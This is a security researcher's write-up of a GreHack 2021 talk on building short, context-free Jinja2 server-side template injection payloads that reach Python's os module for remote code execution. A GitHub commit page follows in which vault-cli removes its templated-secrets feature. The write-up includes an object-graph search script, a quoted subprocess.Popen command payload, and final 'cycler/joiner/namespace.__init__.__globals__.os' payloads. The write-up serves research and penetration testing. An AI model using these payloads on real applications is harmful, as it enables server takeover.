=== Content from podalirius.net_14b19705_20250114_232417.html ===

[Podalirius](https://podalirius.net/en/)

* [Articles](https://podalirius.net/en/articles/)
* [Writeups](https://podalirius.net/en/writeups/)
* [Publications](https://podalirius.net/en/publications/)
* [CVEs](https://podalirius.net/en/cves/)
* |
* [![](https://podalirius.net/en/public/flag_fr.png)](https://podalirius.net/fr/)
* |

# GreHack 2021 - Optimizing Server Side Template Injections payloads for jinja2

November 19, 2021

10-minute read

[publications](https://podalirius.net/en/categories/publications/)

**Table of contents :**

* [Introduction](#introduction)
* [Server Side Template Injections](#server-side-template-injections)
  + [Finding a path between two modules](#finding-a-path-between-two-modules)
* [Python internals](#python-internals)
* [Breadth first search in Python objects](#breadth-first-search-in-python-objects)
  + [Preventing cyclic traps and optimization](#preventing-cyclic-traps-and-optimization)
  + [General algorithm to find modules from a Python object](#general-algorithm-to-find-modules-from-a-python-object)
* [Constructing payloads for jinja2](#constructing-payloads-for-jinja2)
  + [The `TemplateReference` object in jinja2](#the-templatereference-object-in-jinja2)
  + [`TemplateReference` object to `os` module](#templatereference-object-to-os-module)
  + [Context-free payload for Remote Code Execution in jinja2](#context-free-payload-for-remote-code-execution-in-jinja2)
  + [Further optimization](#further-optimization)
* [Conclusion](#conclusion)

---

## Introduction

When attacking Python-based web applications, we often need to find a way to execute commands on the server and escape from the application context. In order to get access to the underlying Python backend of a web application, an attacker can exploit common vulnerabilities such as [Server Side Template Injection (SSTI)](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection) or Code Injections (CI) but how can we escape from this context? In this paper, I present a general approach to solve this problem by exploring python modules and python objects to find paths to high value targets, such as the `os` module or built-in functions. I will then use this technique to create the shortest payloads to access the `os` module in Python’s jinja2 template engine.

* Recorded talk (MP4) : [GreHack\_2021\_-\_Optimizing\_Server\_Side\_Template\_Injections\_payloads\_for\_jinja2.mp4](./GreHack_2021_-_Optimizing_Server_Side_Template_Injections_payloads_for_jinja2.mp4)
* Paper (PDF) : [GreHack\_2021\_-\_Optimizing\_Server\_Side\_Template\_Injections\_payloads\_for\_jinja2 paper.pdf](./GreHack_2021_-_Optimizing_Server_Side_Template_Injections_payloads_for_jinja2_paper.pdf)
* Slides (PDF) : [GreHack\_2021\_-\_Optimizing\_Server\_Side\_Template\_Injections\_payloads\_for\_jinja2 slides.pdf](./GreHack_2021_-_Optimizing_Server_Side_Template_Injections_payloads_for_jinja2_slides.pdf)
* Live talk on YouTube : <https://www.youtube.com/watch?v=2dS34u3T-80&t=25425s>

## Server Side Template Injections

Server Side Template Injections (SSTI) vulnerabilities can happen when an attacker can modify the template code before it being rendered by the template engine. This can happen in a lot of ways, by mixing format strings and templates, by obtaining a write access to the template files, by a file upload vulnerability …

When an attacker finds a Server Side Template Injection, he will try to inject template code to exploit the template engine to gain access to the underlying machine and achieve Remote Code Execution (RCE).

### Finding a path between two modules

Firstly, let’s see what a path from a module to another looks like. With a little bit of research, code review and testing, we can find a path to the `os` module from the `jinja2` module by hand. This is really long as we often need to read the source code of the module to move forward. We can test this path and see that we can access the module `os` from the module `jinja2`:

```
>>> import jinja2
>>> jinja2.bccache.tempfile._os
<module 'os' from '/usr/lib/python3.8/os.py'>
>>>

```
## Python internals

In Python, most variables are actually objects. Python classes’ and objects’ have very interesting internal functions, whose names starts with two underscores `__`. Some of these internal functions are called when the object is converted to a type (`'__bool__', '__float__', '__repr__', '__dict__' ...`) and some of them are used in comparisons (`'__eq__', '__ge__', '__gt__', '__le__', '__lt__','__ne__', '__neg__', ...`). We can list all of the attributes (functions, internal functions, variables) of a Python object through the `dir()` function. Here is an example of the attributes of an `int` object:

```
>>> dir(int(0))
['__abs__', '__add__', '__and__', '__bool__', '__ceil__', '__class__', '__delattr__', '__dir__', '__divmod__', '__doc__', '__eq__', '__float__', '__floor__', '__floordiv__', '__format__', '__ge__', '__getattribute__', '__getnewargs__', '__gt__', '__hash__', '__index__', '__init__', '__init_subclass__', '__int__', '__invert__', '__le__', '__lshift__', '__lt__', '__mod__', '__mul__', '__ne__', '__neg__', '__new__', '__or__', '__pos__', '__pow__', '__radd__', '__rand__', '__rdivmod__', '__reduce__', '__reduce_ex__', '__repr__', '__rfloordiv__', '__rlshift__', '__rmod__', '__rmul__', '__ror__', '__round__', '__rpow__', '__rrshift__', '__rshift__', '__rsub__', '__rtruediv__', '__rxor__', '__setattr__', '__sizeof__', '__str__', '__sub__', '__subclasshook__', '__truediv__', '__trunc__', '__xor__', 'as_integer_ratio', 'bit_length', 'conjugate', 'denominator', 'from_bytes', 'imag', 'numerator', 'real', 'to_bytes']
>>>

```

As we can see, there are many attributes to this object, most of them being internal functions. These functions are called when casting objects, for example calling `str(int(17))` would call the internal `__repr__` function like this: `int(17).__repr__()`.

```
>>> str(int(17))
'17'
>>> int(17).__repr__()
'17'
>>>

```

From these functions and attributes, we can access other attributes, such as other functions, variables or sub-modules. Here is an example of sub-attributes found in the previous `int(0)` object:

```
>>> dir(int(0).__init__)
['__call__', '__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__name__', '__ne__', '__new__', '__objclass__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__self__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__text_signature__']

```

All of these functions can be chained to access one object from another. This is the core concept that most payloads use in [Server Side Template Injections (SSTI) exploits today](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-subprocesspopen), like this one:

```
{{ ''.__class__.mro()[1].__subclasses__()[396]('whoami', shell=True, stdout=-1).communicate()[0].strip() }}

```

This type of payloads can cause various problems because it is **highly context dependent**. Indeed the values of the indexes in `"...__class__.mro()[1].__subclasses__()[396]..."` can vary depending on the version of `jinja2` and the modules used inside the application.

We can find one path from the module `jinja2` to the module `os` by hand, but we simply cannot test every possible path by hand. So, what is next ?

## Breadth first search in Python objects

In order to create a general algorithm to explore python objects and extract high value targets for exploits, we first need to define what high value targets we want to find. We will consider modules and built-in functions as priority targets, as they would constitute the basis for a successful exploitation. These two elements are represented as strings by the `__repr__` function as follows:

* **Modules**: Represented by strings like `<module 'os' from '/usr/lib/python3.8/os.py'>`
* **built-in functions**: Represented by strings like `<built-in function open>`

The first approach to this problem would be to write a recursive function performing a breadth-first search limited to a maximum depth. This function will retrieve all the sub-attributes of an object, and recursively explore them as well.

```
def find_path_to_modules(obj, found={}, path=[], depth=0, maxdepth=3):
    if "modules" not in found.keys():
        found["modules"] = {}
    if depth < maxdepth:
        for subkey in dir(obj):
            try:
                try:
                    subobj = eval("obj.%s" % subkey, {'obj':obj})
                except SyntaxError as e:
                    continue
                if str(subobj).startswith("<module '"):
                    modulename = str(subobj).split("<module '")[1].split("'")[0]
                    print("\r[>] Found module '%s' at %s" % (modulename, '.'.join(path+[subkey])))
                    if modulename not in found["modules"].keys():
                        found["modules"][modulename] = []
                    found["modules"][modulename].append(found["modules"][modulename] + ['.'.join(path+[subkey])])
                # Explore further
                foundmodules = find_path_to_modules(subobj, found=found, path=path+[subkey], depth=(depth+1), maxdepth=maxdepth)
            except AttributeError as e:
                pass
    return found

```

With this first approach to the problem, we have two issues:

* **Cyclic traps**: When exploring a sub attribute of an object referring to itself or one of its parents, we will fall in an infinite loop.
* **Long exploration time**: During the breadth-first search, we will encounter a lot of objects, and many of them more than once. This will result in a massive loss of time while exploring multiple times the same objects.

### Preventing cyclic traps and optimization

In order to prevent **cyclic traps**, we need to keep track of the objects we already explored. To do this, we will create a list containing the `id` of each explored object. The [`id`](https://docs.python.org/3/library/functions.html#id) function returns the address of the object in memory (in CPython implementations), this ensures that the objects are different if their `id()` differs.

### General algorithm to find modules from a Python object

The general algorithm we will use is a recursive function performing a breadth-first search limited to a maximum depth. This function will retrieve all the sub-attributes of an object, and recursively explore them as well. At each step, it will store the [`id()`](https://docs.python.org/3/library/functions.html#id) of the object to prevent falling into cyclic traps.

```
def find_path_to_modules(obj, found={}, path=[], knownids=[], depth=0, maxdepth=3, verbose=False):
    if "modules" not in found.keys(): found["modules"] = {}
    if depth < maxdepth:
        for subkey in dir(obj):
            if verbose == True:
                print("\r\x1b[2K%s" % '.'.join(path+[subkey]), end="")
            if type(subkey) in [bool]:
                continue
            try:
                try:
                    subobj = eval("obj.%s" % subkey, {'obj':obj})
                except SyntaxError as e:
                    continue
                if str(subobj).startswith("<module '"):
                    modulename = str(subobj).split("<module '")[1].split("'")[0]
                    print("\r[>] Found module '%s' at %s" % (modulename, '.'.join(path+[subkey])))
                    if modulename not in found["modules"].keys():
                        found["modules"][modulename] = []
                    found["modules"][modulename] = shorten_module_paths(
                        path[0],
                        modulename,
                        found["modules"][modulename] + ['.'.join(path+[subkey])]
                    )
                # Explore further
                if id(subobj) not in knownids:
                    knownids.append(id(subobj))
                    foundmodules = find_path_to_modules(
                        subobj,
                        found=found,
                        path=path+[subkey],
                        depth=(depth+1),
                        maxdepth=maxdepth,
                        verbose=verbose
                    )
            except AttributeError as e:
                pass
    return found

```
## Constructing payloads for jinja2

### The `TemplateReference` object in jinja2

In jinja2 templates, we can use the `TemplateReference` object to reuse code blocks from the template. For example, to avoid rewriting the title everywhere in the template, we can define the title in a `{% block title %}` block and retrieve it with `{{ self.title() }}` later:

```
>>> msg = jinja2.Template("""
... <title>{% block title %}This is a title{% endblock %}</title>
... <h1>{{ self.title() }}</h1>
... """).render()
>>> print(msg)
<title>This is a title</title>
<h1>This is a title</h1>
>>>

```

The access to the `TemplateReference` object is context-free and it comes with no requirements except being in a jinja2 Template. This is exactly where we would be able to inject code if we managed to get a [Server Side Template Injection (SSTI)](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection) on a web application. We can directly have access to the `TemplateReference` object through a simple `{{ self }}` in a template:

```
>>> jinja2.Template("My name is {{ self }}").render()
'My name is <TemplateReference None>'
>>>

```
### `TemplateReference` object to `os` module

Using the general algorithm described above on `jinja2` as the starting point for the search, we get very interesting results for all the paths to the `os` module:

```
{
  "modules": {
    ...
    "os": [
      "jinja2.utils.os",
      "jinja2.bccache.tempfile._os",
      "jinja2.bccache.tempfile._shutil.os",
      "jinja2.bccache.fnmatch.os",
      "jinja2.loaders.os",
      "jinja2.environment.os",
      "jinja2.filters.random._os",
      "jinja2.bccache.os"
    ]
  }
  ...
}

```

This is all the paths we can reach the `os` module from the `jinja2` module. Now, we will look at the `TemplateReference` object to see what variables we can use. We can see there is a variable that stands out, the `_TemplateReference__context}`:

```
>>> import jinja2
>>> jinja2.Template("My name is {{ f(self) }}").render(f=dir)
"My name is ['_TemplateReference__context', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__']"

```

Now, if we print this object, we get a dictionary with many values:

```
>>> import jinja2
>>> jinja2.Template("My name is {{ self._TemplateReference__context }}").render(f=dir)
"My name is <Context {'range': <class 'range'>, 'dict': <class 'dict'>, 'lipsum': <function generate_lorem_ipsum at 0x7f9a1cb0a0d0>, 'cycler': <class 'jinja2.utils.Cycler'>, 'joiner': <class 'jinja2.utils.Joiner'>, 'namespace': <class 'jinja2.utils.Namespace'>, 'f': <built-in function dir>} of None>"

```

This `{{ self._TemplateReference__context }}` is very interesting because it gives us access to the following classes:

* `jinja2.utils.Cycler`
* `jinja2.utils.Joiner`
* `jinja2.utils.Namespace`

As we have seen before, we can access the `os` module from `jinja2` at the path `jinja2.utils.os`. Therefore, all we need to access `os` from the `TemplateReference` object is to access the global variables of one of the classes Cycler, Joiner, Namespace.

To do this, it’s really simple ! We first need to access the class constructor:

```
>>> import jinja2
>>> jinja2.Template("My name is {{ self._TemplateReference__context.cycler.__init__ }}").render()
'My name is <function Cycler.__init__ at 0x7f696dd06700>'

```

Then access the class constructor global variables (corresponding to the global variables declared in `utils.py` inside jinja2):

```
>>> import jinja2
>>> jinja2.Template("My name is {{ self._TemplateReference__context.cycler.__init__.__globals__ }}").render()
'My name is {\'__name__\': \'jinja2.utils\', \'__doc__\': None, \'__package__\': \'jinja2\', ... ... \'os\': <module \'os\' from \'/usr/lib/python3.8/os.py\'>, ... ..., \'Cycler\': <class \'jinja2.utils.Cycler\'>, \'Joiner\': <class \'jinja2.utils.Joiner\'>, \'Namespace\': <class \'jinja2.utils.Namespace\'>, \'_\': <function _ at 0x7f696dd06670>, \'have_async_gen\': True, \'soft_unicode\': <function soft_unicode at 0x7f696dd06ca0>}'

```

And finally, we can access the `os` module !

```
>>> import jinja2
>>> jinja2.Template("My name is {{ self._TemplateReference__context.cycler.__init__.__globals__.os }}").render()

```
### Context-free payload for Remote Code Execution in jinja2

We now have three context-free payloads that can be used to access the `os` module from the `jinja2` module.

```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os }}

{{ self._TemplateReference__context.joiner.__init__.__globals__.os }}

{{ self._TemplateReference__context.namespace.__init__.__globals__.os }}

```

Let’s render a small template to check if it works:

```
>>> import jinja2
>>> jinja2.Template("My name is {{ self._TemplateReference__context.cycler.__init__.__globals__.os }}").render()
"My name is <module 'os' from '/usr/lib/python3.8/os.py'>

```

These payloads gives us a new, quicker way to access to the `os` module in Server Side Template Injection attacks. This will be really useful in bug bounties and penetration tests !

### Further optimization

Now that we have completely context-free payloads, we can add a final optimization to them. To construct these payloads, we explored the python object tree from the `TemplateReference` object declared within jinja2 templates as `{{ self }}`. This object holds all the variables declared inside the template, therefore we could simplify our payloads by removing the `self._TemplateReference__context` as we can access directly to `joiner`, `cycler` or `namespace` from within the template!

Therefore the final context-free payloads to access the `os` module in jinja2 templates are:

```
{{ cycler.__init__.__globals__.os }}

{{ joiner.__init__.__globals__.os }}

{{ namespace.__init__.__globals__.os }}

```
## Conclusion

In [Server Side Template Injection (SSTI)](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection) vulnerabilities, we can inject template code in the web application, which will then be reflected in the template and executed inside the application context. In order to escape this context and gain Remote Code Execution on the server, we often need to find a way to import the `os` Python module.

In order to find generic ways to access the `os` module, we studied how Python objects and internal functions work in order to design an algorithm capable of exploring Python objects looking for modules, without falling into cyclic traps. With this general algorithm, we were able to [construct context-free payloads](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/) that can be used to achieve Remote Code Execution (RCE) when an attacker has a SSTI in jinja2. Other payloads can also be created to exploit other template engines, [such as Mako for example](https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/).

Â©
2024
Podalirius



=== Content from github.com_f62af5af_20250114_232415.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpeopledoc%2Fvault-cli%2Fcommit%2F3ba3955887fd6b7d4d646c8b260f21cebf5db852)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpeopledoc%2Fvault-cli%2Fcommit%2F3ba3955887fd6b7d4d646c8b260f21cebf5db852)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=peopledoc%2Fvault-cli)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[peopledoc](/peopledoc)
/
**[vault-cli](/peopledoc/vault-cli)**
Public

* [Notifications](/login?return_to=%2Fpeopledoc%2Fvault-cli) You must be signed in to change notification settings
* [Fork
  22](/login?return_to=%2Fpeopledoc%2Fvault-cli)
* [Star
   82](/login?return_to=%2Fpeopledoc%2Fvault-cli)

* [Code](/peopledoc/vault-cli)
* [Issues
  12](/peopledoc/vault-cli/issues)
* [Pull requests
  1](/peopledoc/vault-cli/pulls)
* [Actions](/peopledoc/vault-cli/actions)
* [Projects
  0](/peopledoc/vault-cli/projects)
* [Security](/peopledoc/vault-cli/security)
* [Insights](/peopledoc/vault-cli/pulse)

Additional navigation options

* [Code](/peopledoc/vault-cli)
* [Issues](/peopledoc/vault-cli/issues)
* [Pull requests](/peopledoc/vault-cli/pulls)
* [Actions](/peopledoc/vault-cli/actions)
* [Projects](/peopledoc/vault-cli/projects)
* [Security](/peopledoc/vault-cli/security)
* [Insights](/peopledoc/vault-cli/pulse)

## Commit

[Permalink](/peopledoc/vault-cli/commit/3ba3955887fd6b7d4d646c8b260f21cebf5db852)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge pull request [#198](https://github.com/peopledoc/vault-cli/pull/198) from peopledoc/templates

[Browse files](/peopledoc/vault-cli/tree/3ba3955887fd6b7d4d646c8b260f21cebf5db852)
Browse the repository at this point in the history

* Loading branch information

Joachim Jablon
authored
Dec 15, 2021

2 parents
[fbde0c3](/peopledoc/vault-cli/commit/fbde0c39de13d0b825fdae8024fbb9d8219cb4af)
+
[2abe845](/peopledoc/vault-cli/commit/2abe8451983548fe4ee1c3c792df4c9cf0c0cbfa)

commit 3ba3955

 Show file tree

 Hide file tree

Showing
**13 changed files**
with
**41 additions**
and
**350 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* README.rst
  [README.rst](#diff-7b3ed02bc73dc06b7db906cf97aa91dec2b2eb21f2d92bc5caa761df5bbc168f)
* docs

  + howto

    - docs/howto/environment.rst
      [environment.rst](#diff-a1f80fb140422e1e9cfc93138d2671c9fcf7c8da35e5c4ec33ca3b3cbdaaa88f)
    - docs/howto/systemd.rst
      [systemd.rst](#diff-63b12dab9c63f5bef0b4b014a2e5270a2105604f880b294e159419b66bc596bc)
    - docs/howto/templated\_secrets.rst
      [templated\_secrets.rst](#diff-dd8508cf01fac55fb6419a4a10d650f6ecefc424a32a60b01bece72915cbb462)
    - docs/howto/upgrade.rst
      [upgrade.rst](#diff-2a99a59b034bcb9ea70b29535bc9fb2b59316781fd379cc6bcd56d2a811601b4)
  + docs/howto\_index.rst
    [howto\_index.rst](#diff-838a70ba611e8cee9b0c3100ae2716c233b054aa33ac651e0bc10ce3f3bf1c1a)
* tests/unit

  + tests/unit/test\_cli.py
    [test\_cli.py](#diff-910473b6c2470739b209e36399cf9c87b9c7953c6813071ae3c3d2404b924553)
  + tests/unit/test\_client\_base.py
    [test\_client\_base.py](#diff-572a3cd1b411fc1ddd203e80227b0b0ca9145815e85fe740128ba798c3e85111)
* vault\_cli

  + vault\_cli/cli.py
    [cli.py](#diff-f50a45ace6b8dcf2f312a7a52f93df81151abfdbc37d0ebbfe53c8415d820047)
  + vault\_cli/client.py
    [client.py](#diff-b64ac2ba38c0a8eefeaf75e283bb6b341339e5a5f45aa0bed9be3ac3fe77a536)
  + vault\_cli/environment.py
    [environment.py](#diff-a1a8f2ed8c45e179592403b15db6438fd084919236208b76013a195bca119a54)
  + vault\_cli/settings.py
    [settings.py](#diff-9b4e1422cd2aa649279f22984678faa0fc16fa86868db2d6a1dbdfcc6015edec)
  + vault\_cli/utils.py
    [utils.py](#diff-a2081f85a7d3a9558437b9d7fe0f4d67629ea030671496199ff92c381e1035c9)

## There are no files selected for viewing

1 change: 0 additions & 1 deletion

1
[README.rst](#diff-7b3ed02bc73dc06b7db906cf97aa91dec2b2eb21f2d92bc5caa761df5bbc168f "README.rst")

Show comments

[View file](/peopledoc/vault-cli/blob/3ba3955887fd6b7d4d646c8b260f21cebf5db852/README.rst)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

| Expand Up | | @@ -42,7 +42,6 @@ Some features |
|  |  | - Launch processes with your secrets as environment variables |
|  |  | - Launch processes with ``ssh-agent`` configured from your vault |
|  |  | - Write templated files with secrets inside |
|  |  | - Combine multiple secrets into a single one (e.g. a DSN string from components) |
|  |  |  |
|  |  | ``vault-cli`` tries to make accessing secrets both secure and painless. |
|  |  |  |
| Expand Down | |  |

5 changes: 0 additions & 5 deletions

5
[docs/howto/environment.rst](#diff-a1f80fb140422e1e9cfc93138d2671c9fcf7c8da35e5c4ec33ca3b3cbdaaa88f "docs/howto/environment.rst")

Show comments

[View file](/peopledoc/vault-cli/blob/3ba3955887fd6b7d4d646c8b260f21cebf5db852/docs/howto/environment.rst)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

| Expand Up | | @@ -124,8 +124,3 @@ even if it will be missing some secrets. |
|  |  | .. code:: console |
|  |  |  |
|  |  | $ vault-cli env --envvar myapp --force -- myapp |
|  |  |  |
|  |  | .. warning:: |
|  |  |  |
|  |  | Even if just a single key for a secret produces an error (e.g. a template rendering |
|  |  | error), the whole secret will be missing. |

8 changes: 0 additions & 8 deletions

8
[docs/howto/systemd.rst](#diff-63b12dab9c63f5bef0b4b014a2e5270a2105604f880b294e159419b66bc596bc "docs/howto/systemd.rst")

Show comments

[View file](/peopledoc/vault-cli/blob/3ba3955887fd6b7d4d646c8b260f21cebf5db852/docs/howto/systemd.rst)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

| Expand Up | | @@ -18,14 +18,6 @@ Vault-cli aims at helping you launch your application with the secrets |
|  |  | it needs without writing them on disk. This page lists a few scenarios |
|  |  | that may be useful. |
|  |  |  |
|  |  | If the value you need to pass is directly a secret that is stored in the |
|  |  | vault, perfect. Otherwise, you may want to create a `templated |
|  |  | value`\_\_ |
|  |  | to recreate your secret value by combining static strings and other |
|  |  | secrets. |
|  |  |  |
|  |  | .. \_\_: https://github.com/peopledoc/vault-cli/#create-a-templated-value |
|  |  |  |
|  |  | Let’s assume the value you need to pass is the value you get with: |
|  |  |  |
|  |  | .. code:: console |
| Expand Down | |  |

84 changes: 0 additions & 84 deletions

84
[docs/howto/templated\_secrets.rst](#diff-dd8508cf01fac55fb6419a4a10d650f6ecefc424a32a60b01bece72915cbb462 "docs/howto/templated_secrets.rst")

Show comments

[View file](/peopledoc/vault-cli/blob/fbde0c39de13d0b825fdae8024fbb9d8219cb4af/docs/howto/templated_secrets.rst)
Edit file

Delete file

Load diff

This file was deleted.

Oops, something went wrong.

Retry

8 changes: 8 additions & 0 deletions

8
[docs/howto/upgrade.rst](#diff-2a99a59b034bcb9ea70b29535bc9fb2b59316781fd379cc6bcd56d2a811601b4 "docs/howto/upgrade.rst")

Show comments

[View file](/peopledoc/vault-cli/blob/3ba3955887fd6b7d4d646c8b260f21cebf5db852/docs/howto/upgrade.rst)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

|  |  | @@ -1,6 +1,14 @@ |
|  |  | Upgrade ``vault-cli`` from previous version |
|  |  | =========================================== |
|  |  |  |
|  |  | From 2.x to 3.x |
|  |  | ~~~~~~~~~~~~~~~ |
|  |  |  |
|  |  | Templated values (``!template!{{ vault("a").b }}``) aren't supported anymore. |
|  |  | If you were using those, you will get a warning starting on ``vault-cli~=2.2.1``. |
|  |  |  |
|  |  | On 3.x, a ``--render/--no-render`` flag is still available but it does nothing. |
|  |  |  |
|  |  | From 1.x to 2.x |
|  |  | ~~~~~~~~~~~~~~~ |
|  |  |  |
| Expand Down | |  |

1 change: 0 additions & 1 deletion

1
[docs/howto\_index.rst](#diff-838a70ba611e8cee9b0c3100ae2716c233b054aa33ac651e0bc10ce3f3bf1c1a "docs/howto_index.rst")

Show comments

[View file](/peopledoc/vault-cli/blob/3ba3955887fd6b7d4d646c8b260f21cebf5db852/docs/howto_index.rst)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

| Expand Up | | @@ -12,7 +12,6 @@ How-to... |
|  |  | howto/write |
|  |  | howto/environment |
|  |  | howto/template |
|  |  | howto/templated\_secrets |
|  |  | howto/ssh |
|  |  | howto/systemd |
|  |  | howto/organize |
| Expand Down | |  |

3 changes: 0 additions & 3 deletions

3
[tests/unit/test\_cli.py](#diff-910473b6c2470739b209e36399cf9c87b9c7953c6813071ae3c3d2404b924553 "tests/unit/test_cli.py")

Show comments

[View file](/peopledoc/vault-cli/blob/3ba3955887fd6b7d4d646c8b260f21cebf5db852/tests/unit/test_cli.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -24,7 +24,6 @@ def test\_options(cli\_runner, mocker): |
|  |  | "bla", |
|  |  | "--ca-bundle", |
|  |  | "yay", |
|  |  | "--no-render", |
|  |  | "--login-cert", |
|  |  | "puc", |
|  |  | "--login-cert-key", |
| Expand All | | @@ -47,7 +46,6 @@ def test\_options(cli\_runner, mocker): |
|  |  | assert set(kwargs) == { |
|  |  | "base\_path", |
|  |  | "ca\_bundle", |
|  |  | "render", |
|  |  | "login\_cert", |
|  |  | "login\_cert\_key", |
|  |  | "password", |
| Expand All | | @@ -66,7 +64,6 @@ def test\_options(cli\_runner, mocker): |
|  |  | assert kwargs["url"] == "https://foo" |
|  |  | assert kwargs["username"] == "user" |
|  |  | assert kwargs["verify"] is True |
|  |  | assert kwargs["render"] is False |
|  |  |  |
|  |  |  |
|  |  | @pytest.fixture |
| Expand Down | |  |

136 changes: 2 additions & 134 deletions

136
